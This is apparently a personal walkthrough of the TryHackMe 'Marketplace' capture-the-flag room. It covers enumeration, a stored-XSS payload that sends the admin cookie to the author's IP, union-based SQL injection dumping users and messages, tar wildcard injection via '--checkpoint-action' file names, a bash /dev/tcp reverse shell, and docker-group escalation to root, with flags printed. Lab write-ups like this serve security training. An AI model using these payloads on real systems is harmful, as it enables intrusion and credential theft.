# Marketplace TryHackMe Writeup
- Link: https://tryhackme.com/room/marketplace
- First IP Address: 10.10.238.163, Second IP Address: 10.10.77.225
- Date: 23 June, 2025

Nmap Scan:
```┌──(kali㉿kali)-[~/Downloads/THM/marketplace]
└─$ nmap -sC -sV 10.10.238.163 -o nmapscan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 11:51 +04
Nmap scan report for 10.10.238.163
Host is up (0.13s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.17 seconds
```

### Port 80:
Gobuster:
```┌──(kali㉿kali)-[~/Downloads/THM/marketplace]
└─$ gobuster dir -u http://10.10.238.163 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.163
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 153]
/.hta                 (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/admin                (Status: 403) [Size: 392]
/Admin                (Status: 403) [Size: 392]
/ADMIN                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Port 32768:
Gobuster:
```┌──(kali㉿kali)-[~/Downloads/THM/marketplace]
└─$ gobuster dir -u http://10.10.238.163:32768 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.163:32768
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 392]
/Admin                (Status: 403) [Size: 392]
/ADMIN                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

-> Upon further inspection, it seems they are both the same page.


/admin:
![](attachments/Pasted%20image%2020250623115746.png)


/login:
![](attachments/Pasted%20image%2020250623115816.png)

/signup:
![](attachments/Pasted%20image%2020250623115856.png)

- Signing up with an account user123:pass123

/new: 
![](attachments/Pasted%20image%2020250623120018.png)

- Trying XSS script in input fields
- XSS seems to work!
`
```
<script>alert("!)</script>
```

![](attachments/Pasted%20image%2020250623120206.png)

-> Using burpsuite, I took a look at the cookie in the requests

![](attachments/Pasted%20image%2020250623122023.png)

```┌──(kali㉿kali)-[~/Downloads/THM/marketplace]
└─$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidXNlcjEyMyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzUwNjY2NDg0fQ.wyb0IU2thHI2Sl77tIXqdvGoggthag9o4xIgMdEYNu8" | base64 -d
{"alg":"HS256","typ":"JWT"}base64: invalid input
```

-> Seems like its a JWT cookie
-> Decoding further

![](attachments/Pasted%20image%2020250623122212.png)

-> When reporting a listing, we receive a message from the system telling us that the admin will review the listing.
-> Using XSS, let's try to steal the token cookie

```
<script>document.write('<img src="http://10.8.35.149?c='+document.cookie+'" />');</script>
```

-> Now, if we report the listing, we should be able to steal the admins cookie

```┌[──(kali㉿kali)-[~/Downloads/THM/marketplace]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.35.149 - - [23/Jun/2025 12:25:46] "GET /?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidXNlcjEyMyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzUwNjY2NDg0fQ.wyb0IU2thHI2Sl77tIXqdvGoggthag9o4xIgMdEYNu8 HTTP/1.1" 200 -](<┌──(kali㉿kali)-[~/Downloads/THM/marketplace]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.35.149 - - [23/Jun/2025 12:25:46] "GET /?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidXNlcjEyMyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzUwNjY2NDg0fQ.wyb0IU2thHI2Sl77tIXqdvGoggthag9o4xIgMdEYNu8 HTTP/1.1" 200 -
10.10.238.163 - - [23/Jun/2025 12:27:10] "GET /?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NTA2NjcyMjl9.i4ThKVEnujt6_34qZDUVeYzj4rfcKs2jv7NA1Wumlao HTTP/1.1" 200 ->)
```

![](attachments/Pasted%20image%2020250623122821.png)

-> Using burpsuite, I can now replace my cookie with Michael's
-> Obtained **Flag 1**

![](attachments/Pasted%20image%2020250623123026.png)

-> Looks like the URL is vulnerable to sqli
![](attachments/Pasted%20image%2020250623123346.png)

![](attachments/Pasted%20image%2020250623123606.png)
![](attachments/Pasted%20image%2020250623123620.png)

-> Thus, we can conclude through error that there are 4 columns
-> At this point, I was trying sqli to get table names but I was getting a bunch of errors. After a lot of trying, I realized the machine had expired so I had to start a new machine.

New IP Address: 10.10.77.225

-> After reproducing all the previous steps, I was back at the point where I left off

SQLi commands used:
```
union select database(),null,null,null
```
![](attachments/Pasted%20image%2020250623164700.png)

```
union select group_concat(table_name),null,null,null from information_schema.tables where table_schema='marketplace'
```
![](attachments/Pasted%20image%2020250623164736.png)

```
union select group_concat(column_name),null,null,null from information_schema.columns where table_schema=database() and table_name = 'users'
```

![](attachments/Pasted%20image%2020250623164902.png)

```
union select group_concat(username,password),null,null,null from users
```
![](attachments/Pasted%20image%2020250623165125.png)

-> I tried to crack the password for a while, but I couldn't find anything even after a while so I went back to check the messages table for anything useful

```
union select group_concat(column_name),null,null,null from information_schema.columns where table_schema=database() and table_name = 'messages'
```
![](attachments/Pasted%20image%2020250623165428.png)

```
union select group_concat(id,message_content,user_from,user_to),null,null,null from messages
```
![](attachments/Pasted%20image%2020250623165742.png)

-> We have obtained a ssh password, but the user who this email was sent to still seems a bit unclear. So, I decided to add ':' between each field to avoid confusion

```
union select group_concat(id,0x3a,message_content,0x3a,user_from,0x3a,user_to),null,null,null from messages
```
![](attachments/Pasted%20image%2020250623165957.png)
-> From this we can tell the email was sent to 3, which, from the administration panel is jake.
-> Hence, Jake's credentials are jake:@b_ENXkGYUCAv3zJ

-> Logging into SSH
```┌──(kali㉿kali)-[~]
└─$ ssh jake@10.10.77.225                            
The authenticity of host '10.10.77.225 (10.10.77.225)' can't be established.
ED25519 key fingerprint is SHA256:Rl4+lAmQWEhSKHNbPY/BoNdG16/4xcmIXNIlSrBasm0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.77.225' (ED25519) to the list of known hosts.
jake@10.10.77.225's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun 23 13:01:37 UTC 2025

  System load:  0.0                Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.77.225
  Memory usage: 28%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    97

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


jake@the-marketplace:~$ ls
user.txt
jake@the-marketplace:~$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
jake@the-marketplace:~$
```

-> Obtained Flag 2 (User.txt)

-> Running ```sudo -l```:
```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

```
jake@the-marketplace:/opt/backups$ ls
backup.sh  backup.tar
jake@the-marketplace:/opt/backups$ cat backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

-> Looking up tar on gtfo.bins, we find this:
![](attachments/Pasted%20image%2020250623170545.png)

Reverse shell script:
```
#!/bin/bash
bash -i >& /dev/tcp/10.8.35.149/4433 0>&1
```

Creating files required as in gtfo.bins command:
```
touch "/var/www/html/--checkpoint-action=exec=bash shell.sh"
touch "/var/www/html/--checkpoint=1"
```

We now have escalated privileges to michael:
```
jake@the-marketplace:/opt/backups$ touch ./--checkpoint=1
jake@the-marketplace:/opt/backups$ touch ./--checkpoint-action=exec=sh shell.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.shBacking up files...
$ whoami
michael
```

-> Transferring linpeas.sh to target machine for further enumeration:
```
michael@the-marketplace:/tmp$ wget 10.8.35.149:8000/linpeas.sh
--2025-06-23 13:44:40--  http://10.8.35.149:8000/linpeas.sh
Connecting to 10.8.35.149:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840139 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 820.45K   388KB/s    in 2.1s    

2025-06-23 13:44:42 (388 KB/s) - ‘linpeas.sh’ saved [840139/840139]
```

-> Looks like michael is part of the docker group

![](attachments/Pasted%20image%2020250623174730.png)

-> Once again using gtfobins

![](attachments/Pasted%20image%2020250623174853.png)

```
marketplace:/home/michael$ docker run -it --rm -v /:/mnt alpine chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@c8584f61947b:/# whoami
root
root@c8584f61947b:/# cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

-> With that, we have found the final flag for this room.

